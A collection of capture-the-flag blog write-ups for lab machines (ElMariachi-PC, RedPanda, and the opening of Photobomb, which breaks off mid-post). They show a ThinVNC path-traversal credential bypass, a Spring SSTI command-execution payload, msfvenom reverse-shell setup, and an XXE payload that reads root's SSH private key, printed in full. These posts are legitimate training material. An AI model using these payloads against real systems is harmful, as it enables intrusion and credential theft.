[{"content":" This writeup has been authorized by the PwnTillDawn Crew!\nCheck their websites for more information!\nwizlynxgroup online.pwntilldawn Target Information Name IP Operating System Difficulty ElMariachi-PC 10.150.150.69 Windows Easy Scanning Nmap Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 $ nmap 10.150.150.69 -A -p- --min-rate=5000 -n -sT -Pn --open -oG allports Nmap scan report for 10.150.150.69 Host is up (0.094s latency). Not shown: 54303 closed tcp ports (conn-refused), 11221 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=ElMariachi-PC | Not valid before: 2022-11-18T13:20:31 |_Not valid after: 2023-05-20T13:20:31 |_ssl-date: 2022-11-19T16:45:57+00:00; +41m04s from scanner time. | rdp-ntlm-info: | Target_Name: ELMARIACHI-PC | NetBIOS_Domain_Name: ELMARIACHI-PC | NetBIOS_Computer_Name: ELMARIACHI-PC | DNS_Domain_Name: ElMariachi-PC | DNS_Computer_Name: ElMariachi-PC | Product_Version: 10.0.17763 |_ System_Time: 2022-11-19T16:45:28+00:00 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 50417/tcp open msrpc Microsoft Windows RPC 60000/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Not Found | Content-Type: text/html | Content-Length: 177 | Connection: Keep-Alive | \u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;TITLE\u0026gt;404 Not Found\u0026lt;/TITLE\u0026gt;\u0026lt;/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;404 Not Found\u0026lt;/H1\u0026gt;The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.\u0026lt;P\u0026gt;\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt; | GetRequest: | HTTP/1.1 401 Access Denied | Content-Type: text/html | Content-Length: 144 | Connection: Keep-Alive | WWW-Authenticate: Digest realm=\u0026#34;ThinVNC\u0026#34;, qop=\u0026#34;auth\u0026#34;, nonce=\u0026#34;Bh5opIvq5UDI4UcCi+rlQA==\u0026#34;, opaque=\u0026#34;m2yqFi2usv3AY2yatYSTRmyNPAplB8C1oC\u0026#34; |_ \u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;TITLE\u0026gt;401 Access Denied\u0026lt;/TITLE\u0026gt;\u0026lt;/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;401 Access Denied\u0026lt;/H1\u0026gt;The requested URL requires authorization.\u0026lt;P\u0026gt;\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port60000-TCP:V=7.93%I=7%D=11/19%Time=6378FE2E%P=x86_64-pc-linux-gnu%r( SF:GetRequest,179,\u0026#34;HTTP/1\\.1\\x20401\\x20Access\\x20Denied\\r\\nContent-Type:\\x SF:20text/html\\r\\nContent-Length:\\x20144\\r\\nConnection:\\x20Keep-Alive\\r\\nW SF:WW-Authenticate:\\x20Digest\\x20realm=\\\u0026#34;ThinVNC\\\u0026#34;,\\x20qop=\\\u0026#34;auth\\\u0026#34;,\\x20no SF:nce=\\\u0026#34;Bh5opIvq5UDI4UcCi\\+rlQA==\\\u0026#34;,\\x20opaque=\\\u0026#34;m2yqFi2usv3AY2yatYSTRmyN SF:PAplB8C1oC\\\u0026#34;\\r\\n\\r\\n\u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;TITLE\u0026gt;401\\x20Access\\x20Denied\u0026lt;/TITLE\u0026gt;\u0026lt; SF:/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;401\\x20Access\\x20Denied\u0026lt;/H1\u0026gt;The\\x20requested\\x20URL\\x20 SF:\\x20requires\\x20authorization\\.\u0026lt;P\u0026gt;\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt;\\r\\n\u0026#34;)%r(FourOhFourRequ SF:est,111,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Type:\\x20text/html SF:\\r\\nContent-Length:\\x20177\\r\\nConnection:\\x20Keep-Alive\\r\\n\\r\\n\u0026lt;HTML\u0026gt;\u0026lt;H SF:EAD\u0026gt;\u0026lt;TITLE\u0026gt;404\\x20Not\\x20Found\u0026lt;/TITLE\u0026gt;\u0026lt;/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;404\\x20Not\\x20Fo SF:und\u0026lt;/H1\u0026gt;The\\x20requested\\x20URL\\x20nice%20ports%2C/Tri%6Eity\\.txt%2ebak SF:\\x20was\\x20not\\x20found\\x20on\\x20this\\x20server\\.\u0026lt;P\u0026gt;\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt;\\r\\n\u0026#34; SF:); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 41m04s, deviation: 0s, median: 41m03s | smb2-time: | date: 2022-11-19T16:45:28 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required It looks like this machine have only ports related to SMB and DNS services.\nEnumeration I am going to enumerate anything possible about SMB services as it is most likely to have exploits.\nSMB Enumeration Now, I will use an auxiliary in Metasploit Framework to scan for the SMB version to search if it is vulnerable to any exploits or not!\nMetasploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 msf6 \u0026gt; search auxiliary/scanner/smb/smb_version Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/smb/smb_version normal No SMB Version Detection Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version msf6 \u0026gt; use auxiliary/scanner/smb/smb_version msf6 auxiliary(scanner/smb/smb_version) \u0026gt; options Module options (auxiliary/scanner/smb/smb_version): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U sing-Metasploit THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_version) \u0026gt; set RHOSTS 10.150.150.69 RHOSTS =\u0026gt; 10.150.150.69 msf6 auxiliary(scanner/smb/smb_version) \u0026gt; run [*] 10.150.150.69:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{12ce29e0-f300-4650-b6a7-8851bc744142}) (authentication domain:ELMARIACHI-PC) [*] 10.150.150.69: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed SMB Detected (versions:2, 3) Authentication domain: ELMARIACHI-PC\nSmbClient I think i will use the SmbClient tool to see if there are any shared resources.\n1 2 $ smbclient -L //10.150.150.69 -N session setup failed: NT_STATUS_ACCESS_DENIED Looks like it is prohibted to access those shares.\nPort 60000 Enumeration So, I think this port is related to HTTP services as we can see from the output of nmap scanning.\nLet\u0026rsquo;s open the browser see what is up there?\nAlso, From the nmap scanning i have found:\nWWW-Authenticate: Digest realm=\u0026quot;ThinVNC\u0026quot;, qop=\u0026ldquo;auth\u0026rdquo;, nonce=\u0026ldquo;Bh5opIvq5UDI4UcCi+rlQA==\u0026rdquo;,\nThinVNC is a web remote access client (browser-based, HTML5). It\u0026rsquo;s an improved version of the standard VNC protocol.\nLet\u0026rsquo;s see if there are any exploits or default credientials for this software.\nI have found this Article which explains how to bypass the authentication of ThinVNC software.\nLet\u0026rsquo;s do this step by step:\nOpen Burpsuite and intercept the signing in process.\nChange the URL to this path /admin/../../ThinVnc.ini to navigate to the default credientials (authentication) page.\nSign in using the Username and Password resulted from the directory traversal attack. 1 2 User=desperado Password=TooComplicatedToGuessMeAhahahahahahahh Now, We can connect to the victim machine remotely. We can navigate using File Explorer and get the Flag. 1 FLAG67 = 2971f3459fe55db1237aadXXXXXXXXXXXXXXXX Pwned\n","date":"2022-11-19T00:00:00Z","image":"https://AbdallahAdham.com/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG","permalink":"https://AbdallahAdham.com/p/elmariachi-pc-pwntilldawn-writeup/","title":"ElMariachi-PC PwnTillDawn Writeup"},{"content":" Scanning Nmap 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -A -T4 -p- -oN nmap.txt 10.10.11.170 Nmap scan report for 10.10.11.170 Host is up (0.17s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot Enumeration Directory Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://redpanda.htb:8080/FUZZ /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://redpanda.htb:8080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ search [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 91ms] # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 140ms] # directory-list-2.3-medium.txt [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms] # Copyright 2007 James Fisher [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms] stats [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 81ms] error [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 91ms] I have found 2 directories which are stats and error but they have nothing we have do about them.\nbut in stats we see that there are images for two authors that may help us.\nBy looking at the author \u0026ldquo;woodenk\u0026rdquo;, There are some images and every time you view one of them, It increases the number of views by 1 and so on.\nBut, Nothing else is important!\nLets go back to the home page and search on one of those images!\nWeb Enumeration Let\u0026rsquo;s see what is the first thing we see when we open the website?\nNow, Let\u0026rsquo;s search on \u0026ldquo;greg\u0026rdquo; and see what are the results?\nOkay, This is a little hint i think so!\nAfter a lot of injections, such as XSS, LFI, SQLi and SSRF nothing worked .. But one thing which is SSTI.\nExploitation Server Side Template Injection (SSTI) Detect I have tried a lot of payloads to detect if the server is vulnerable or not.\n1 2 3 4 5 6 {{7*7}} ${7*7} \u0026lt;%= 7*7 %\u0026gt; ${{7*7}} #{7*7} *{7*7} The only two payloads that worked with me are: #{7*7} and *{7*7}.\nIdentify After a lot of searching i have fount that the template engine is called Spring Framework (Java)\nExploit I have found that article from HackTricks, It talks about everything of SSTI from detection to exploitation .. Check it out!\nFrom it, I have found a payload which makes me get an RCE!\nLet\u0026rsquo;s start by getting the id command:\n1 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream())} Now, I have initalize a listener and get a Reverse Shell!\nInitialize a Listener: 1 2 $ nc -nlvp 4444 listening on [any] 4444 ... Spawn a Reverse shell payload using MsVenom: 1 2 3 4 5 6 7 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf -o reverse.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes Saved as: reverse.elf Initialize a Python server: 1 2 $ python3 -m http.server 9000 Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ... Upload the Reverse shell payload at the victim\u0026rsquo;s machine: Make sure the payload is stored there. So, It is uploaded successfully!\nGive the payload the permissions to be executed: Make sure it has the execution permissions: Run the payload: Lastly, Recieve the Reverse Shell: Then, We spawn TTY and make our Revshell as interactive as possible.\n1 2 3 4 5 6 7 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z zsh: suspended nc -nlvp 4444 └─$ stty raw -echo ; fg [1] + continued nc -nlvp 4444 woodenk@redpanda:/tmp/hsperfdata_woodenk$ woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm Now, You have the most interactive shell you can have with auto-complete and no interruptions.\nBack to our mission, Let\u0026rsquo;s go and grap the user.txt.\n1 2 woodenk@redpanda:/home/woodenk$ cat user.txt 74e9066ca96ac03b9eXXXXXXXXXXXXX Post-Exploitation linpeas.sh Firstly, We initialize a Python server in order to send linpeas.sh to the victim machine.\n1 2 $ python3 -m http.server 9000 Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ... Then, At the victim machine we go the /tmp folder and download the script.\n1 2 3 4 5 6 7 8 9 10 11 12 woodenk@redpanda:/tmp/hsperfdata_woodenk$ wget http://10.10.16.34:9000/linpeas.sh --2022-11-15 18:12:02-- http://10.10.16.34:9000/linpeas.sh Connecting to 10.10.16.34:9000... connected. HTTP request sent, awaiting response... 200 OK Length: 827827 (808K) [text/x-sh] Saving to: ‘linpeas.sh’ linpeas.sh 100%[===================\u0026gt;] 808.42K 240KB/s in 3.4s 2022-11-15 18:12:06 (240 KB/s) - ‘linpeas.sh’ saved [827827/827827] woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x linpeas.sh woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./linpeas.sh Apparently, Nothing i have got from linpeas.sh.\nid So, by looking at the result of the id command, We can see that we are belonging to a group called logs!\n1 2 woodenk@redpanda:/tmp/hsperfdata_woodenk$ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) Which is very interesting because we dont know what is this group and maybe it is our way to get the root privilage.\nSo, Let\u0026rsquo;s find everything under the permission of that group:\n1 2 woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -group logs 2\u0026gt;/dev/null /opt/panda_search/redpanda.log Let\u0026rsquo;s run pspy64 and see what processes are running in the background.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 woodenk@redpanda:/tmp$ wget 10.10.16.34:9000/pspy64 --2022-11-16 14:23:41-- http://10.10.X.X:9000/pspy64 Connecting to 10.10.16.34:9000... connected. HTTP request sent, awaiting response... 200 OK Length: 4468984 (4.3M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[===================\u0026gt;] 4.26M 268KB/s in 16s 2022-11-16 14:23:57 (275 KB/s) - ‘pspy64’ saved [4468984/4468984] woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x pspy64 woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./pspy64 --------------------------------------------------------------------- 2022/11/16 14:26:01 CMD: UID=0 PID=7093 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar --------------------------------------------------------------------- There is a JAR file being executed as root (UID=0), Which i have to investigate about and see what is does.\nLet\u0026rsquo;s transfer it to our attacker machine and see how does it work?\n1 2 3 4 5 6 7 8 9 10 11 $ wget http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar --2022-11-16 09:33:00-- http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar Resolving redpanda.htb (redpanda.htb)... 10.10.11.170 Connecting to redpanda.htb (redpanda.htb)|10.10.11.170|:9000... connected. HTTP request sent, awaiting response... 200 OK Length: 1280956 (1.2M) [application/java-archive] Saving to: ‘final-1.0-jar-with-dependencies.jar’ final-1.0-jar-with-dependenci 100%[===============================================\u0026gt;] 1.22M 714KB/s in 1.8s 2022-11-16 09:33:02 (714 KB/s) - ‘final-1.0-jar-with-dependencies.jar’ saved [1280956/1280956] I have used a tool called \u0026ldquo;jd-gui\u0026rdquo; that is used to displays Java source codes.\nBy running the JAR file called \u0026ldquo;final-1.0-jar-with-dependencies.jar\u0026rdquo; we can see in the main() class:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); while (log_reader.hasNextLine()) { String line = log_reader.nextLine(); if (!isImage(line)) continue; Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); System.out.println(\u0026#34;Artist: \u0026#34; + artist); String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } } We can see that the redpanda.log file will be read line by line and there are some conditions for the image to be passed:\nThe line must contain .jpg as the extension of the image. 1 2 3 4 5 public static boolean isImage(String filename) { if (filename.contains(\u0026#34;.jpg\u0026#34;)) return true; return false; } The line will be splitted with the delimiter as \u0026ldquo;||\u0026rdquo; and the below attributes will be set to each part of the line. 1 2 3 4 5 6 7 8 9 public static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.valueOf(Integer.parseInt(strings[0]))); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } The Author\u0026rsquo;s tag metadata of the image file must be matched with /credits/\u0026lt;author_name\u0026gt;_creds.xml 1 2 3 4 5 6 7 8 9 10 11 12 public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for (Directory dir : metadata.getDirectories()) { for (Tag tag : dir.getTags()) { if (tag.getTagName() == \u0026#34;Artist\u0026#34;) return tag.getDescription(); } } return \u0026#34;N/A\u0026#34;; } The image file must be in a folder that has a WRITE access such as /tmp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for (Element el : rootElement.getChildren()) { if (el.getName() == \u0026#34;image\u0026#34;) if (el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)) { Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1); System.out.println(\u0026#34;Total views:\u0026#34; + Integer.toString(totalviews.intValue())); rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews.intValue())); Integer views = Integer.valueOf(Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText())); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views.intValue() + 1)); } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } Now, We are going to make our exploit that includes the .jpg and .xml files.\nLet\u0026rsquo;s begin with the .jpg file:\nI have got a random image and removed all its metadata using exiftool. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ exiftool -all= jpg_exploit.jpg Warning: ICC_Profile deleted. Image colors may be affected - jpg_exploit.jpg 1 image files updated └─$ exiftool jpg_exploit.jpg ExifTool Version Number : 12.49 File Name : jpg_exploit.jpg Directory : . File Size : 4.9 MB File Modification Date/Time : 2022:11:16 10:31:34-05:00 File Access Date/Time : 2022:11:16 10:31:34-05:00 File Inode Change Date/Time : 2022:11:16 10:31:34-05:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg Image Width : 6720 Image Height : 4480 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 6720x4480 Megapixels : 30.1 Now we add the Artist tag with a path of directory that has a WRITE access. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ exiftool -Artist=\u0026#34;../tmp/pwn\u0026#34; jpg_exploit.jpg 1 image files updated └─$ exiftool jpg_exploit.jpg ExifTool Version Number : 12.49 File Name : jpg_exploit.jpg Directory : . File Size : 4.9 MB File Modification Date/Time : 2022:11:16 10:32:33-05:00 File Access Date/Time : 2022:11:16 10:32:33-05:00 File Inode Change Date/Time : 2022:11:16 10:32:33-05:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg Exif Byte Order : Big-endian (Motorola, MM) X Resolution : 72 Y Resolution : 72 Resolution Unit : inches Artist : ../tmp/pwn Y Cb Cr Positioning : Centered Image Width : 6720 Image Height : 4480 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 6720x4480 Megapixels : 30.1 Finally, Send the .jpg file to victim\u0026rsquo;s tmp directory. Now, We go for the .xml file:\nWe construct the .xml as the ones the already exist to avoid any confliction in the structure. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;woodenk\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/greg.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/hungy.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smooch.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smiley.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;1\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; We create our pwn_creds.xml and we will use XML Entity Expansion (XXE) to inject a payload that can print the private ssh credientials of root. 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///root/.ssh/id_rsa\u0026#34; \u0026gt;]\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;pwn\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/../../../../../../tmp/jpg_exploit.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;1\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; Then, Send the below string to /opt/panda_search/redpanda.log. 1 echo \u0026#34;222||a||a||/../../../../../../tmp/jpg_exploit.jpg\u0026#34; \u0026gt; /opt/panda_search/redpanda.log Now, It is time to get the SSH key of the root:\nView the /tmp/jpg_creds.xml to see the root\u0026rsquo;s private SSH key in it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 woodenk@redpanda:/tmp$ cat /tmp/jpg_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;pwn\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/../../../../../../tmp/jpg_exploit.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29 ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE= -----END OPENSSH PRIVATE KEY-----\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;1\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; Store it in any text file and change its permissions. 1 $ chmod 600 ssh_key.txt Connect to the victim\u0026rsquo;s machine using SSH with root privilages. 1 2 3 4 5 $ ssh -i ssh_key.txt root@10.10.11.170 root@redpanda:~# id uid=0(root) gid=0(root) groups=0(root) root@redpanda:~# cat root.txt 0c9a981760e9e26XXXXXXXXXXXXXX Pwned ","date":"2022-11-16T00:00:00Z","image":"https://AbdallahAdham.com/post/RedPanda_HTB/redpanda_htb.jpg","permalink":"https://AbdallahAdham.com/p/redpanda-htb-writeup/","title":"RedPanda HTB Writeup"},{"content":" Scanning Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ nmap 10.10.11.182 -A -T4 -p- -oN nmap.txt Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-10 08:38 EST Nmap scan report for 10.10.11.182 Host is up (0.20s latency). Not shown: 65524 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e22473bbfbdf5cb520b66876748ab58d (RSA) | 256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA) |_ 256 20e05d8cba71f08c3a1819f24011d29e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 17692/tcp filtered unknown 18162/tcp filtered unknown 22855/tcp filtered unknown 24998/tcp filtered unknown 44623/tcp filtered unknown 45323/tcp filtered unknown 45854/tcp filtered unknown 48742/tcp filtered unknown 55815/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 849.15 seconds After the scan has finished, Ofcourse i will add the machine IP to /etc/hosts.\n1 $ sudo echo \u0026#34;10.10.11.182 photobomb.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumeration HTTP Enumeration Now, We open the browser and see what is in this website.\nThere is a \u0026ldquo;Click here!\u0026rdquo; button, Let\u0026rsquo;s click on it ans see what happens?\nIt opens a pop-up sign up form and asks for a username and password and if failed it redirects you to a \u0026ldquo;401 Authorization Required\u0026rdquo; under a /printer directory.\nNow, I will do two things which are:\nSubdomain Enumeration Directory Bruteforce Subdomain Enumeration 1 $ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.photobomb.htb\u0026#34; -u http://photobomb.htb -t 10 -mc 200 I have not found any subdomains that exist.\nDirectory Bruteforce I am going to use Dirbuster:\n1 2 3 4 5 6 7 8 9 10 11 12 DirBuster 1.0-RC1 - Report http://photobomb.htb:80 -------------------------------- Directories found during testing: Dirs found with a 200 response: / Files found with 